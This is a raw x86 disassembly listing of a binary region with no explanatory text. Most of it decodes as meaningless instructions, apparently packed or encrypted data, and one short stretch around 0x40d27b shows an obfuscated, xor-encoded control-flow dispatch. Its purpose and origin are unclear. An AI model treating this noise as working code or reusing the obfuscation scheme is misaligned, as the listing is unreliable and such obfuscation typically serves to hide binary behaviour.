  40cdbd:	popa   
  40cdbe:	ret    
  40cdbf:	retf   
  40cdc0:	test   ah,0xe5
  40cdc3:	or     esi,DWORD PTR ds:0xe04f277c
  40cdc9:	jb     0x40ce2e
  40cdcb:	popa   
  40cdcc:	icebp  
  40cdcd:	lds    ebp,FWORD PTR [esi]
  40cdcf:	pusha  
  40cdd0:	pop    esi
  40cdd1:	pop    es
  40cdd2:	jo     0x40cdb6
  40cdd4:	or     bl,dh
  40cdd6:	jmp    DWORD PTR [ebx+0x2e]
  40cdd9:	dec    esi
  40cdda:	mov    DWORD PTR [esp+ebp*1],ebp
  40cddd:	mov    ecx,DWORD PTR [esi]
  40cddf:	sub    ch,0x43
  40cde2:	cli    
  40cde3:	clc    
  40cde4:	int3   
  40cde5:	nop
  40cde6:	and    al,0x2a
  40cde8:	popa   
  40cde9:	mov    DWORD PTR [eax-0x42],0xc72b2a9b
  40cdf0:	jg     0x40ce26
  40cdf2:	dec    edx
  40cdf3:	loope  0x40cdf1
  40cdf5:	pop    ss
  40cdf6:	loopne 0x40ce56
  40cdf8:	xor    eax,0xd27023b4
  40cdfd:	and    bh,BYTE PTR [edi]
  40cdff:	mov    dh,0x97
  40ce01:	not    DWORD PTR [ebp-0x5e]
  40ce04:	imul   ecx,ecx,0x62
  40ce07:	mov    cs,WORD PTR [ebx-0x7bb834c3]
  40ce0d:	lahf   
  40ce0e:	sub    DWORD PTR [ebp+0x24b4aea8],edi
  40ce14:	outs   dx,BYTE PTR ds:[esi]
  40ce15:	pop    ss
  40ce16:	push   es
  40ce17:	push   esi
  40ce18:	mov    BYTE PTR [eax+0x7e],ah
  40ce1b:	pop    ecx
  40ce1c:	jnp    0x40ce27
  40ce1e:	stc    
  40ce1f:	in     eax,dx
  40ce20:	shl    bh,cl
  40ce22:	xor    al,0x98
  40ce24:	pop    ebp
  40ce25:	bound  edx,QWORD PTR [ebp-0x3b9952b7]
  40ce2b:	or     eax,0x6829eee3
  40ce30:	pop    esi
  40ce31:	push   eax
  40ce32:	dec    edi
  40ce33:	lahf   
  40ce34:	std    
  40ce35:	adc    ebx,DWORD PTR [ebx]
  40ce37:	sahf   
  40ce38:	jnp    0x40cdec
  40ce3a:	arpl   WORD PTR [ecx+ebx*2],bx
  40ce3d:	sub    ah,0x95
  40ce40:	and    BYTE PTR [edx+0x6bb8aa79],al
  40ce46:	sub    bl,BYTE PTR [ebx-0xcc38751]
  40ce4c:	or     ecx,DWORD PTR [edi+0x2e]
  40ce4f:	loopne 0x40ce3e
  40ce51:	nop
  40ce52:	dec    ebx
  40ce53:	cwde   
  40ce54:	clc    
  40ce55:	aaa    
  40ce56:	inc    edi
  40ce57:	int3   
  40ce58:	mov    edx,0xf0c715c
  40ce5d:	scas   al,BYTE PTR es:[edi]
  40ce5e:	jo     0x40ce4e
  40ce60:	outs   dx,DWORD PTR ds:[esi]
  40ce61:	(bad)  
  40ce62:	nop    ebx
  40ce65:	sbb    dl,dh
  40ce67:	mov    ch,0xa5
  40ce69:	imul   BYTE PTR [edx-0x2aa5bb1a]
  40ce6f:	shl    BYTE PTR [esi+0x71],cl
  40ce72:	outs   dx,BYTE PTR ds:[esi]
  40ce73:	lahf   
  40ce74:	push   ss
  40ce75:	push   es
  40ce76:	inc    ecx
  40ce77:	out    dx,eax
  40ce78:	popf   
  40ce79:	jle    0x40cedf
  40ce7b:	mov    edi,0xc4d239d3
  40ce80:	test   ch,al
  40ce82:	xor    ebp,esi
  40ce84:	jb     0x40cebd
  40ce86:	aas    
  40ce87:	lds    eax,FWORD PTR [ecx+eax*2]
  40ce8a:	int3   
  40ce8b:	or     BYTE PTR [ecx+0x62d3b973],ch
  40ce91:	mov    bh,0x79
  40ce93:	idiv   DWORD PTR [edi-0x571e93b9]
  40ce99:	add    al,ch
  40ce9b:	sahf   
  40ce9c:	mov    cl,0x5
  40ce9e:	xor    BYTE PTR [ebp-0x69],bh
  40cea1:	adc    DWORD PTR [esi],0x5f04d941
  40cea7:	add    ebp,DWORD PTR [esi]
  40cea9:	(bad)  
  40ceaa:	scas   al,BYTE PTR es:[edi]
  40ceab:	mov    al,ds:0xd4b96f5b
  40ceb0:	into   
  40ceb1:	psubusw mm3,QWORD PTR [ecx+0x63a55106]
  40ceb8:	and    ch,bl
  40ceba:	stos   BYTE PTR es:[edi],al
  40cebb:	test   DWORD PTR [edi-0x1be71db1],edi
  40cec1:	dec    esp
  40cec2:	sbb    al,0xdc
  40cec4:	sub    BYTE PTR [ebx],ch
  40cec6:	pop    edx
  40cec7:	rcl    BYTE PTR [esi-0x3],cl
  40ceca:	jp     0x40ce9f
  40cecc:	jo     0x40ce70
  40cece:	sub    al,0x58
  40ced0:	shr    BYTE PTR [eax+0x6b14c2ff],0x30
  40ced7:	xchg   ebp,eax
  40ced8:	fwait
  40ced9:	push   ebp
  40ceda:	push   ds
  40cedb:	aaa    
  40cedc:	pop    ss
  40cedd:	ss xchg ecx,eax
  40cedf:	pop    eax
  40cee0:	mov    ebp,DWORD PTR [ecx+0x1c]
  40cee3:	mov    eax,0x70a5a06c
  40cee8:	sbb    BYTE PTR [edx],dl
  40ceea:	or     DWORD PTR [ecx],edi
  40ceec:	inc    edi
  40ceed:	and    edi,DWORD PTR [edx+ecx*8]
  40cef0:	push   ecx
  40cef1:	aam    0x80
  40cef3:	jns    0x40cec9
  40cef5:	add    ebp,esp
  40cef7:	sub    cl,bl
  40cef9:	repnz pop edx
  40cefb:	pop    ss
  40cefc:	xchg   BYTE PTR [edx-0x22],dh
  40ceff:	mov    bh,dh
  40cf01:	xor    esi,DWORD PTR [edx+ebx*2]
  40cf04:	sbb    dl,cl
  40cf06:	inc    esi
  40cf07:	lea    ebp,[ebp+0x76]
  40cf0a:	bound  edx,QWORD PTR [eax+0x3e]
  40cf0d:	jl     0x40cf47
  40cf0f:	iret   
  40cf10:	fild   QWORD PTR [eax]
  40cf12:	sub    DWORD PTR [eax+0x17472cca],eax
  40cf18:	test   BYTE PTR [ecx],ah
  40cf1a:	and    al,0xef
  40cf1c:	test   eax,0x17579e3e
  40cf21:	or     DWORD PTR [edi-0x18903aad],ebp
  40cf27:	addr16 leave 
  40cf29:	outs   dx,BYTE PTR ds:[esi]
  40cf2a:	rol    BYTE PTR [esi-0x6cf334a5],cl
  40cf30:	jns    0x40cf69
  40cf32:	lss    esp,FWORD PTR [edi+edi*4+0x4759c58b]
  40cf3a:	jae    0x40cf87
  40cf3c:	std    
  40cf3d:	inc    esi
  40cf3e:	add    al,0x4b
  40cf40:	or     eax,0x9c640c42
  40cf45:	add    BYTE PTR [eax+edi*1],al
  40cf48:	xchg   esi,eax
  40cf49:	mov    eax,ds:0x427b1bde
  40cf4e:	icebp  
  40cf4f:	push   esp
  40cf50:	loopne 0x40cfa7
  40cf52:	pusha  
  40cf53:	xor    BYTE PTR [ebx],cl
  40cf55:	sbb    esi,DWORD PTR [ecx+0x61]
  40cf58:	jno    0x40cfa5
  40cf5a:	(bad)  
  40cf5b:	loopne 0x40cf9f
  40cf5d:	sub    ecx,ebp
  40cf5f:	daa    
  40cf60:	gs pop edi
  40cf62:	xlat   BYTE PTR ds:[ebx]
  40cf63:	xchg   DWORD PTR [edi-0x7b],edi
  40cf66:	aas    
  40cf67:	lds    ecx,FWORD PTR [ebx-0x42]
  40cf6a:	not    ebp
  40cf6c:	jp     0x40cf3a
  40cf6e:	ins    BYTE PTR es:[edi],dx
  40cf6f:	cwde   
  40cf70:	test   BYTE PTR [ebx+0x30],dl
  40cf73:	bound  ebx,QWORD PTR [ecx]
  40cf75:	push   ebp
  40cf76:	and    al,0x8f
  40cf78:	mov    edx,0xce71a60b
  40cf7d:	bound  edi,QWORD PTR [ebx]
  40cf7f:	das    
  40cf80:	mov    cl,0x51
  40cf82:	dec    ecx
  40cf83:	mov    eax,0x1e20913f
  40cf88:	adc    DWORD PTR [edx],ecx
  40cf8a:	stos   DWORD PTR es:[edi],eax
  40cf8b:	lock add al,0x1a
  40cf8e:	jmp    0x1881e1f2
  40cf93:	pop    esp
  40cf94:	inc    edi
  40cf95:	push   ds
  40cf96:	sub    al,0x8
  40cf98:	mov    al,0x32
  40cf9a:	aas    
  40cf9b:	fcmovb st,st(6)
  40cf9d:	pop    ecx
  40cf9e:	mov    bl,0xc7
  40cfa0:	push   ds
  40cfa1:	push   cs
  40cfa2:	out    0x1f,al
  40cfa4:	sub    eax,0x9ef56f74
  40cfa9:	lea    ecx,[edi+0x143d0206]
  40cfaf:	add    eax,0xd5440ed0
  40cfb4:	fmul   DWORD PTR [edi]
  40cfb6:	out    dx,eax
  40cfb7:	aad    0x52
  40cfb9:	les    edx,FWORD PTR [ecx]
  40cfbb:	pushf  
  40cfbc:	and    al,0xe0
  40cfbe:	cdq    
  40cfbf:	in     al,dx
  40cfc0:	pop    ebx
  40cfc1:	sbb    al,0x2d
  40cfc3:	sbb    al,0x17
  40cfc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfc6:	xchg   edx,eax
  40cfc7:	add    DWORD PTR [ecx+0x151c6a86],edi
  40cfcd:	pop    eax
  40cfce:	mov    ds:0x5b6cfb37,al
  40cfd3:	push   es
  40cfd4:	adc    BYTE PTR [edx],ch
  40cfd6:	pop    esi
  40cfd7:	add    BYTE PTR [edx],ah
  40cfd9:	sbb    BYTE PTR [eax],dl
  40cfdb:	push   es
  40cfdc:	mov    DWORD PTR [esi],edx
  40cfde:	and    DWORD PTR [ebx+0x7a99638b],ebp
  40cfe4:	cmp    esi,ebx
  40cfe6:	cmp    dl,dh
  40cfe8:	push   edx
  40cfe9:	call   0xaf22c794
  40cfee:	idiv   DWORD PTR ds:0xe611ff12
  40cff4:	push   ebp
  40cff5:	adc    ecx,DWORD PTR [ebx+0x1d]
  40cff8:	fsubp  st(0),st
  40cffa:	pusha  
  40cffb:	addr16 in al,0x0
  40cffe:	scas   eax,DWORD PTR es:[edi]
  40cfff:	enter  0xbde1,0xfd
  40d003:	dec    ecx
  40d004:	pop    edx
  40d005:	jbe    0x40cff3
  40d007:	push   ds
  40d008:	lea    edi,[ebp+0x1ec1bbf8]
  40d00e:	mov    ecx,0x4c6fb29f
  40d013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d014:	xchg   esi,eax
  40d015:	push   edi
  40d016:	cmp    eax,0x71a873ea
  40d01b:	lahf   
  40d01c:	aaa    
  40d01d:	es retf 0x9bb4
  40d021:	shr    DWORD PTR [eax+0x49],1
  40d024:	mov    eax,?
  40d026:	loope  0x40d041
  40d028:	in     eax,dx
  40d029:	stos   DWORD PTR es:[edi],eax
  40d02a:	push   0x52
  40d02c:	cmp    eax,DWORD PTR [eax]
  40d02e:	and    al,BYTE PTR [edx]
  40d030:	bound  esi,QWORD PTR [esi]
  40d032:	add    BYTE PTR [ecx],al
  40d034:	aam    0x73
  40d036:	jb     0x40d078
  40d038:	cmp    edx,DWORD PTR [ebp-0x4]
  40d03b:	addr16 pop ss
  40d03d:	dec    eax
  40d03e:	pushf  
  40d03f:	retf   
  40d040:	push   esp
  40d041:	xchg   dl,al
  40d043:	mov    ebp,0x4463cc48
  40d048:	lds    ebx,FWORD PTR [eax+0x582b7799]
  40d04e:	dec    edi
  40d04f:	jmp    ecx
  40d051:	mov    ebx,0xd785230e
  40d056:	inc    edx
  40d057:	dec    eax
  40d058:	adc    edi,eax
  40d05a:	jmp    0x40d070
  40d05c:	nop
  40d05d:	out    0x89,al
  40d05f:	and    eax,0xe2018882
  40d064:	push   ecx
  40d065:	jo     0x40d075
  40d067:	js     0x40d083
  40d069:	frstor ds:0x5782f2a
  40d06f:	sti    
  40d070:	test   al,0x5a
  40d072:	std    
  40d073:	xchg   edi,eax
  40d074:	sbb    BYTE PTR [esi-0xa],cl
  40d077:	rol    DWORD PTR [ecx+0x5b34c0c4],0x65
  40d07e:	pop    es
  40d07f:	or     BYTE PTR [eax-0x16],bh
  40d082:	add    eax,0x53f5cfa4
  40d087:	jl     0x74602ac0
  40d08d:	imul   DWORD PTR [esi]
  40d08f:	mov    WORD PTR [esi-0x7a2d0f2],ds
  40d095:	xchg   edi,eax
  40d096:	pop    edi
  40d097:	inc    ecx
  40d098:	jecxz  0x40d04c
  40d09a:	(bad)
  40d09d:	out    dx,al
  40d09e:	mov    dl,0xf0
  40d0a0:	or     esi,DWORD PTR [ecx]
  40d0a2:	icebp  
  40d0a3:	xor    eax,ebp
  40d0a5:	lock inc esp
  40d0a7:	test   DWORD PTR [edi-0x1a],ebx
  40d0aa:	xor    esi,edi
  40d0ac:	in     al,0xc9
  40d0ae:	(bad)  
  40d0af:	or     al,0x65
  40d0b1:	inc    BYTE PTR [ecx]
  40d0b3:	clc    
  40d0b4:	jecxz  0x40d060
  40d0b6:	shrd   edx,esi,cl
  40d0b9:	fcomp  st(6)
  40d0bb:	sahf   
  40d0bc:	clc    
  40d0bd:	ins    BYTE PTR es:[edi],dx
  40d0be:	aas    
  40d0bf:	adc    eax,0xf019ed24
  40d0c4:	mov    edx,gs
  40d0c6:	push   es
  40d0c7:	xchg   DWORD PTR [edx+0x287f3703],ebp
  40d0cd:	bound  ebp,QWORD PTR [edx+eax*4]
  40d0d0:	mov    edi,0xf93923da
  40d0d5:	pop    ebx
  40d0d6:	push   0x80431ac1
  40d0db:	jle    0x40d0f1
  40d0dd:	mov    bl,ch
  40d0df:	or     esp,ebp
  40d0e1:	mov    eax,ds:0x3ae95610
  40d0e6:	adc    bh,BYTE PTR [ecx+0x184bea5c]
  40d0ec:	mov    eax,ds:0x67d9cbe0
  40d0f1:	std    
  40d0f2:	test   DWORD PTR [ebx+0x48c6605],esp
  40d0f8:	fadd   QWORD PTR ds:0x9e675f0f
  40d0fe:	dec    eax
  40d0ff:	xor    eax,DWORD PTR [edx]
  40d101:	push   esp
  40d102:	test   ah,ah
  40d104:	xlat   BYTE PTR ds:[ebx]
  40d105:	std    
  40d106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d107:	jg     0x40d14e
  40d109:	sahf   
  40d10a:	aad    0xfd
  40d10c:	xchg   BYTE PTR ds:0x69f7f495,al
  40d112:	add    BYTE PTR [edi],al
  40d114:	dec    ebx
  40d115:	(bad)  
  40d116:	jns    0x40d0d8
  40d118:	lea    esp,[ecx-0xb724c1b]
  40d11e:	rcr    DWORD PTR [esi+0x7],1
  40d121:	sub    edi,DWORD PTR [esi+0x4f]
  40d124:	push   cs
  40d125:	pop    edi
  40d126:	or     ecx,DWORD PTR [eax]
  40d128:	jmp    0x57c05710
  40d12d:	mov    ebp,0xcfbe2421
  40d132:	cmp    al,0x1c
  40d134:	push   ecx
  40d135:	push   esi
  40d136:	xchg   DWORD PTR [eax+0x22],edi
  40d139:	mov    ds:0xeafbf189,al
  40d13e:	fidiv  WORD PTR [ebp-0x55e7636d]
  40d144:	mov    BYTE PTR [edi+eiz*8],bh
  40d147:	xor    dl,BYTE PTR [edi+0x2a]
  40d14a:	shl    DWORD PTR [edi],0xde
  40d14d:	add    dh,ah
  40d14f:	call   0x992775b5
  40d154:	leave  
  40d155:	retf   
  40d156:	jae    0x40d0e9
  40d158:	pop    ss
  40d159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d15a:	pop    edi
  40d15b:	imul   ebp,ecx,0xffffffb9
  40d15e:	add    al,0xad
  40d160:	jo     0x40d154
  40d162:	xor    dh,ah
  40d164:	mov    cl,0x8e
  40d166:	mov    edi,0x5b70831
  40d16b:	cs jns 0x40d1b7
  40d16e:	out    0x3e,al
  40d170:	or     al,0xa0
  40d172:	ins    DWORD PTR es:[edi],dx
  40d173:	push   ds
  40d174:	fcmovb st,st(4)
  40d176:	div    ebp
  40d178:	prefetch BYTE PTR [edx+0x15b35eef]
  40d17f:	push   ss
  40d180:	adc    DWORD PTR [esi+0x1796e00a],ecx
  40d186:	jg     0x40d206
  40d188:	xchg   ebx,eax
  40d189:	sub    BYTE PTR [esi-0x6d9b3c2c],0x1b
  40d190:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d191:	add    bh,BYTE PTR [ecx-0x4e56b6ab]
  40d197:	mov    ds:0x95b3f25e,al
  40d19c:	xor    BYTE PTR ds:0x2714c344,0x99
  40d1a3:	cmp    esi,DWORD PTR [edi]
  40d1a5:	xchg   al,al
  40d1a7:	pop    esp
  40d1a8:	aas    
  40d1a9:	or     al,0x8f
  40d1ac:	ja     0x40d150
  40d1ae:	adc    dh,BYTE PTR [ecx+0x3c]
  40d1b1:	out    dx,eax
  40d1b2:	call   FWORD PTR [esi]
  40d1b4:	mov    eax,ds:0x928d1da8
  40d1b9:	daa    
  40d1ba:	push   edi
  40d1bb:	xor    ch,bh
  40d1bd:	inc    ebx
  40d1be:	pop    eax
  40d1bf:	scas   eax,DWORD PTR es:[edi]
  40d1c0:	cmp    eax,0x36ee0e00
  40d1c5:	pop    ecx
  40d1c6:	sbb    al,0xc6
  40d1c8:	pop    edi
  40d1c9:	inc    ebx
  40d1ca:	pop    es
  40d1cb:	mov    ah,0xbf
  40d1cd:	jle    0x40d1ab
  40d1cf:	cmp    edi,DWORD PTR [esi+0x76]
  40d1d2:	out    dx,al
  40d1d3:	int    0xde
  40d1d5:	mov    edi,0x9624bf73
  40d1da:	ds out 0x98,eax
  40d1dd:	jnp    0x40d18c
  40d1df:	test   BYTE PTR [ebx+0x72],ah
  40d1e2:	jo     0x40d1c3
  40d1e4:	cmp    DWORD PTR [esi-0x6f5a8d06],edi
  40d1ea:	xchg   edx,eax
  40d1eb:	pop    ecx
  40d1ec:	xor    edx,esi
  40d1ee:	in     eax,0x85
  40d1f0:	xchg   bp,ax
  40d1f2:	fcmovnb st,st(7)
  40d1f4:	pop    ss
  40d1f5:	cmp    ah,BYTE PTR [edx+0xaa849e0]
  40d1fb:	in     al,dx
  40d1fc:	pmullw mm6,mm6
  40d1ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d200:	and    DWORD PTR [ebx],0xffffffd9
  40d203:	pushf  
  40d204:	or     ah,dh
  40d206:	push   ebp
  40d207:	add    ebx,DWORD PTR [ebx+0x12]
  40d20a:	in     al,dx
  40d20b:	rol    esp,cl
  40d20d:	jmp    0x378320b7
  40d212:	xchg   esi,eax
  40d213:	mov    DWORD PTR [edx+0x425314c9],ebx
  40d219:	cmp    DWORD PTR [ebp+0x61],ebx
  40d21c:	ds cmc 
  40d21e:	jmp    0x40d1ae
  40d220:	call   0xbda0161f
  40d225:	sub    BYTE PTR [edx+edi*4+0x7d],dh
  40d229:	push   edx
  40d22a:	jmp    0x57a:0xa5aef9f8
  40d231:	xchg   ebx,eax
  40d232:	rcr    BYTE PTR [esi-0x23],1
  40d235:	(bad)  
  40d236:	aad    0xe2
  40d238:	mov    eax,0x1f59e5ff
  40d23d:	mov    esp,0x85720132
  40d242:	sbb    DWORD PTR [edi+ebp*4+0x4fe5aebd],eax
  40d249:	mov    ecx,0x17cae405
  40d24e:	out    0x63,al
  40d250:	adc    al,0x73
  40d252:	(bad)  
  40d253:	sbb    BYTE PTR [ebp-0x80],ch
  40d256:	push   edx
  40d257:	out    0x8e,eax
  40d259:	mov    bh,0xc8
  40d25b:	pop    ebx
  40d25c:	sbb    BYTE PTR [eax+eiz*1],bl
  40d25f:	xchg   edx,eax
  40d260:	sub    eax,0x845ea137
  40d265:	gs push esp
  40d267:	cmp    esp,DWORD PTR [esi]
  40d269:	retf   
  40d26a:	and    DWORD PTR [ebx-0x37c438fd],0xf
  40d271:	test   BYTE PTR [eax],bh
  40d273:	add    BYTE PTR [eax],al
  40d275:	add    cl,ch
  40d277:	and    al,0x0
  40d279:	add    BYTE PTR [eax],al
  40d27b:	mov    eax,DWORD PTR [ebp-0x4]
  40d27e:	mov    ecx,DWORD PTR [ebp-0x8]
  40d281:	xor    eax,esi
  40d283:	add    eax,edi
  40d285:	cmp    ecx,eax
  40d287:	mov    eax,DWORD PTR [ebp-0x4]
  40d28a:	je     0x40d2e9
  40d290:	mov    ecx,DWORD PTR [ebp-0x30]
  40d293:	xor    eax,esi
  40d295:	add    eax,edi
  40d297:	cmp    ecx,eax
  40d299:	je     0x40f6a6
  40d29f:	lea    eax,[ebp-0x8]
  40d2a2:	push   eax
  40d2a3:	push   DWORD PTR [ebp-0x28]
  40d2a6:	push   DWORD PTR [ebp+0xc]
  40d2a9:	call   0x411c5a
  40d2ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d2b1:	mov    ecx,DWORD PTR [ebp-0x8]
  40d2b4:	xor    eax,esi
  40d2b6:	add    eax,edi
  40d2b8:	cmp    ecx,eax
  40d2ba:	je     0x40d2d5
  40d2c0:	mov    eax,DWORD PTR [ebp-0x34]
  40d2c3:	movzx  eax,WORD PTR [eax+ebx*2]
  40d2c7:	mov    ecx,DWORD PTR [ebp-0x14]
  40d2ca:	mov    eax,DWORD PTR [ecx+eax*4]
  40d2cd:	mov    DWORD PTR [ebp-0x38],eax
  40d2d0:	jmp    0x40d27b
  40d2d5:	mov    eax,DWORD PTR [ebp-0xc]
  40d2d8:	xor    eax,esi
  40d2da:	lea    ebx,[ebx+eax*1+0x3272f3]
  40d2e1:	jmp    0x4087e2
  40d2e6:	mov    eax,DWORD PTR [ebp-0x4]
  40d2e9:	xor    eax,esi
  40d2eb:	jmp    0x40f69f
  40d2f0:	add    BYTE PTR [esi],cl
  40d2f2:	mov    ch,BYTE PTR [esp+eax*4+0x5e8600a0]
  40d2f9:	hlt    
  40d2fa:	aas    
  40d2fb:	push   eax
  40d2fc:	iret   
  40d2fd:	sbb    BYTE PTR [eax-0x7c2d6a71],0x83
  40d304:	call   0xa4c45665
  40d309:	or     eax,0xc4d97d59
  40d30e:	mov    ecx,0x3bb7fa22
  40d313:	add    esp,DWORD PTR [edi+0x32e13864]
  40d319:	retf   0x4a74
  40d31c:	scas   eax,DWORD PTR es:[edi]
  40d31d:	mov    ds:0x60817ceb,eax
  40d322:	inc    esp
  40d323:	lea    edi,[ebx-0x5fae461b]
  40d329:	xor    al,0xc8
  40d32b:	punpckhbw mm3,mm4
  40d32e:	sbb    bh,BYTE PTR ds:0x75275feb
  40d334:	loope  0x40d381
  40d336:	das    
  40d337:	xchg   DWORD PTR [eax],esi
  40d339:	std    
  40d33a:	in     eax,dx
  40d33b:	push   es
  40d33c:	repnz and BYTE PTR [edx],bl
  40d33f:	call   0x3a8a0984
  40d344:	int    0xa1
  40d346:	mov    ebx,0x272b09b1
  40d34b:	pop    ecx
  40d34c:	mov    edi,0xdf0590ec
  40d351:	jno    0x40d321
  40d353:	mov    ebx,0xd1dd2344
  40d358:	and    dh,BYTE PTR [eax]
  40d35a:	cmp    dh,al
  40d35c:	jg     0x40d2e0
  40d35e:	mov    esp,0x53da702d
  40d363:	aas    
  40d364:	xchg   edx,eax
  40d365:	mov    bl,0xaa
  40d367:	cli    
  40d368:	ins    DWORD PTR es:[edi],dx
  40d369:	in     eax,0x7a
  40d36b:	scas   al,BYTE PTR es:[edi]
  40d36c:	aam    0x1e
  40d36e:	shl    BYTE PTR [ebx+0x13],cl
  40d371:	std    
  40d372:	into   
  40d373:	cdq    
  40d374:	inc    edi
  40d375:	push   edx
  40d376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d377:	sbb    esi,edi
  40d379:	iret   
  40d37a:	or     ch,BYTE PTR [esi-0x10]
  40d37d:	neg    DWORD PTR [esi-0x2c]
  40d380:	iret   
  40d381:	hlt    
  40d382:	fdivr  DWORD PTR [edx-0x351fda3d]
  40d388:	mov    BYTE PTR [edx-0x33],al
  40d38b:	xchg   esp,eax
  40d38c:	hlt    
  40d38d:	jbe    0x40d39f
  40d38f:	sub    BYTE PTR [eax-0xd7aa21c],dl
  40d395:	jg     0x40d347
  40d397:	lods   al,BYTE PTR ds:[esi]
  40d398:	dec    esi
  40d399:	out    0xc9,al
  40d39b:	popa   
  40d39c:	arpl   WORD PTR [esi-0x64a3633d],si
  40d3a2:	dec    esp
  40d3a3:	fild   WORD PTR [ecx]
  40d3a5:	mov    dh,0xc0
  40d3a7:	mov    es,WORD PTR [ecx-0x417233a0]
  40d3ad:	rol    DWORD PTR [edx-0x6e5c008],cl
  40d3b3:	xor    ch,BYTE PTR [edx+0x32a29737]
  40d3b9:	js     0x40d360
  40d3bb:	idiv   BYTE PTR [ebx+0x7a]
  40d3be:	and    bh,dl
  40d3c0:	test   al,0xc5
  40d3c2:	or     ah,ah
  40d3c4:	xor    bl,BYTE PTR [ebp+edi*2+0x45fa6cef]
  40d3cb:	jecxz  0x40d381
  40d3cd:	and    al,0xe1
  40d3cf:	repz cmp DWORD PTR [edi+0x1a],eax
  40d3d3:	ret    
  40d3d4:	lds    esi,FWORD PTR [edx+0xc]
  40d3d7:	ins    BYTE PTR es:[edi],dx
  40d3d8:	jne    0x40d444
  40d3da:	adc    BYTE PTR [edi-0x44],al
  40d3dd:	scas   eax,DWORD PTR es:[edi]
  40d3de:	scas   eax,DWORD PTR es:[edi]
  40d3df:	sbb    BYTE PTR [eax],0x77
  40d3e2:	add    eax,0x3397ece3
  40d3e7:	lods   al,BYTE PTR ds:[esi]
  40d3e8:	out    0xea,al
  40d3ea:	mov    eax,ebx
  40d3ec:	into   
  40d3ed:	call   0x1e73:0xe18384cb
  40d3f4:	ja     0x40d444
  40d3f6:	inc    edx
  40d3f7:	mov    edx,0x65399b60
  40d3fc:	pop    ds
  40d3fd:	inc    ebp
  40d3fe:	nop
  40d3ff:	push   esp
  40d400:	mov    esp,0xd52e6d79
  40d405:	dec    edi
  40d406:	cmp    BYTE PTR [edx+0x62],0xfe
  40d40a:	push   cs
  40d40b:	cmp    ebp,eax
  40d40d:	loope  0x40d3fe
  40d40f:	fisttp WORD PTR [eax]
  40d411:	dec    edx
  40d412:	rcr    BYTE PTR [esi],0xbd
  40d415:	aad    0x1e
  40d417:	ret    
  40d418:	addr16 sub al,0xeb
  40d41b:	adc    ebx,DWORD PTR [ecx]
  40d41d:	mov    ah,0x6b
  40d41f:	xchg   ecx,eax
  40d420:	in     al,0x22
  40d422:	jns    0x40d499
  40d424:	jle    0x40d3f4
  40d426:	icebp  
  40d427:	into   
  40d428:	fisubr DWORD PTR [ebx]
  40d42a:	loop   0x40d3e8
  40d42c:	ja     0x40d3d7
  40d42e:	xchg   BYTE PTR [edx-0x72],ah
  40d431:	mov    esp,0x3401366e
  40d436:	mov    WORD PTR [ebx-0x77],?
  40d439:	sbb    ebx,edx
  40d43b:	jno    0x40d435
  40d43d:	popf   
  40d43e:	scas   al,BYTE PTR es:[edi]
  40d43f:	mov    cl,cl
  40d441:	jnp    0x40d4b4
  40d443:	adc    al,cl
  40d445:	mov    dl,cl
  40d447:	dec    ebp
  40d448:	xchg   edx,eax
  40d449:	retf   0x3e4f
  40d44c:	(bad)  
  40d44e:	arpl   bp,bp
  40d450:	adc    al,bh
  40d452:	or     al,0x5b
  40d454:	and    al,0x69
  40d456:	enter  0x8456,0xdf
  40d45a:	out    0x18,al
  40d45c:	retf   0x1929
  40d45f:	mov    dl,0xff
  40d461:	mov    ds:0xcb71229c,al
  40d466:	stos   BYTE PTR es:[edi],al
  40d467:	push   ss
  40d468:	mov    dh,0xe8
  40d46a:	mov    ecx,fs
  40d46c:	push   edx
  40d46d:	hlt    
  40d46e:	cld    
  40d46f:	stos   BYTE PTR es:[edi],al
  40d470:	add    bl,dh
  40d472:	std    
  40d473:	popa   
  40d474:	sbb    eax,0x96e11b0d
  40d479:	inc    esp
  40d47a:	xchg   edx,eax
  40d47b:	inc    ebp
  40d47c:	push   0x56df68af
  40d481:	dec    esi
  40d482:	cli    
  40d483:	ins    BYTE PTR es:[edi],dx
  40d484:	imul   ebx,edx,0xffffffec
  40d487:	shl    BYTE PTR [ecx-0x1],cl
  40d48a:	sub    BYTE PTR [edx],bh
  40d48c:	or     eax,0xb37e24f2
  40d491:	push   0x8a9bcaff
  40d496:	push   es
  40d497:	mov    ebp,0xe7a85b0f
  40d49c:	xor    al,0xf9
  40d49e:	iret   
  40d49f:	jne    0x40d453
  40d4a1:	dec    esp
  40d4a2:	mov    cl,0xaa
  40d4a4:	pop    ds
  40d4a5:	inc    edx
  40d4a6:	add    BYTE PTR [edx+0x9feca44],0x62
  40d4ad:	ss pop edi
  40d4af:	jno    0x40d4c6
  40d4b1:	addr16 popa 
  40d4b3:	sbb    cl,BYTE PTR [edi]
  40d4b5:	ja     0x40d47e
  40d4b7:	cmp    al,0xf1
  40d4b9:	dec    esi
  40d4ba:	test   al,0x9f
  40d4bc:	sbb    ebp,esi
  40d4be:	leave  
  40d4bf:	sar    BYTE PTR [edx-0x45],1
  40d4c2:	sbb    BYTE PTR [edx+0x3a6f5c02],0x5b
  40d4c9:	sub    ch,ch
  40d4cb:	sbb    dl,bl
  40d4cd:	lds    edx,FWORD PTR [ecx-0x76]
  40d4d0:	mov    DWORD PTR [ebp+0x29bb4637],eax
  40d4d6:	or     al,0x4e
  40d4d8:	mov    al,0xda
  40d4da:	addr16 mov ds:0x6854,al
  40d4de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4df:	nop
  40d4e0:	cdq    
  40d4e1:	outs   dx,DWORD PTR ds:[esi]
  40d4e2:	mov    cl,0xae
  40d4e4:	mov    eax,ds:0x83f3f74e
  40d4e9:	mov    ds:0x4d0a551,eax
  40d4ee:	cs std 
  40d4f0:	icebp  
  40d4f1:	into   
  40d4f2:	js     0x40d498
  40d4f4:	js     0x40d558
  40d4f6:	inc    esp
  40d4f7:	and    DWORD PTR ds:0xdec702cd,0xbaf5f970
  40d501:	dec    esp
  40d502:	adc    al,BYTE PTR [edi+0x191c4673]
  40d508:	andps  xmm3,XMMWORD PTR [ebx+edi*1]
